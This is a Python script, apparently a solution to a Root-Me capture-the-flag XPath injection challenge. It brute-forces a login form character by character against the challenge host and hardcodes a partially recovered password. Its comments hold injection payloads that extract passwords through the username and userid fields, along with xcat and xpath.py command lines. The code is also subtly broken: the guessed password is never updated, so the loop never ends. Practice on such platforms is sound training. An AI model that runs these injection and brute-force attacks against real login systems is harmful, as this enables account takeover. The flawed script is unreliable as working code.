import http.client, urllib.request, urllib.parse, urllib.error
import sys
import string

MSG_OK = "Welcome back"
MSG_ERROR = "Wrong credentials"


def go(passwd):
  params = urllib.parse.urlencode(
    {
      # 'username': "admin' and password like '%" + passwd + "' -- ",
      "username": "John",
      "password": passwd
    })
  headers = {"Content-type": "application/x-www-form-urlencoded",
        "Accept": "text/plain"}

  conn = http.client.HTTPConnection("challenge01.root-me.org")
  conn.request("POST", "/web-serveur/ch24/?action=login", params, headers)
  response = conn.getresponse()
  data = response.read()
  data = data.decode('utf-8')
  conn.close()
  # print(type(MSG_OK))
  if MSG_OK in data:
    return True
  else:
    return False
  # if MSG_ERROR in data:
  #   return False
  return None

passwd = "eiJ4a65@1.oS"
char = string.ascii_letters + string.digits + "_/.,!@#$^&+()_-+[]{};`:\"\\<>/?|"

# e2azo93i
# passwd = [['e', 'E'], ['2'], ['a', 'A'], ['z', 'Z'], ['o', 'O'], ['9'], ['3'], ['i', 'I']]
# def x(cur, lst):
#   if len(lst) == 0:
#     print(cur, go(cur))
#     return

#   for o in lst[0]:
#     x(cur + o, lst[1:])

# x("", passwd)
# http://challenge01.root-me.org/web-serveur/ch24/?action=user&
# userid=111111] | //user[1][userid=1 and substring(//user[2]
#   /password,1,1)=substring(//user[1]/username,1,1) ] | //user[userid=1111

# xcat -m=GET http://challenge01.root-me.org/web-serveur/ch24/
# python2 xpath.py -u http://challenge01.root-me.org --data "/web-serveur/ch24/?action=user&userid=2" --dbs
while True:
  for ch in char:
    res = go(ch + passwd)
    if res is True:
      # print(passwd, flush=True, end='')
      print(ch + passwd)
      sys.stdout.flush()
      break

    if res is False:
      print(".", flush=True, end='')
      # sys.stdout.write(".")
      # sys.stdout.flush()
      continue

  # print(passwd)
print("Final password is: " + passwd)